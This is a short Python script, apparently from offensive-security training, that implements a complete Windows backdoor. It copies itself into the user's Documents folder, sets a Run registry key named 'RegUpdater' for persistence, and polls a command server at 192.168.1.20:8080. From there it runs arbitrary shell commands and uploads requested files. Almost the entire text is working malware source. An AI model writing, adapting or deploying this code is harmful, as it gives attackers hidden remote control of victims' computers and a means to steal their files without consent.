#Data exfiltration – HTTP Client
import os
import requests
import subprocess
import time
import shutil
import winreg
import random

# Reconn Phase

path = os.getcwd()  # Get current working directory where the backdoor gets executed, we use the output to build our source path

userprof = os.getenv('USERPROFILE')  # Get USERPROFILE which contains the username of the profile

destination = os.path.join(userprof, 'Documents', 'persistence.exe')  # build the destination path where we copy your backdoor

# First and Second Phases

if not os.path.exists(destination):
    # First time our backdoor gets executed
    # Copy our Backdoor to C:\Users\<UserName>\Documents\
    shutil.copyfile(os.path.join(path, 'persistence.exe'), destination)

    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, 'RegUpdater', 0, winreg.REG_SZ, destination)
    key.Close()

def connect():
    while True:
        try:
            req = requests.get('http://192.168.1.20:8080')
            return req.text
        except Exception as e:
            print(f"Connection failed: {e}")
            time.sleep(random.randint(1, 10))

while True:
    command = connect()

    if 'terminate' in command:
        break  # end the loop

    elif 'grab' in command:
        grab, path = command.split('*')
        if os.path.exists(path):
            url = 'http://192.168.1.20:8080/store'
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://192.168.1.20:8080', data='[-] Not able to find the file !')

    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://192.168.1.20:8080', data=CMD.stdout.read())
        post_response = requests.post(url='http://192.168.1.20:8080', data=CMD.stderr.read())

    time.sleep(3)
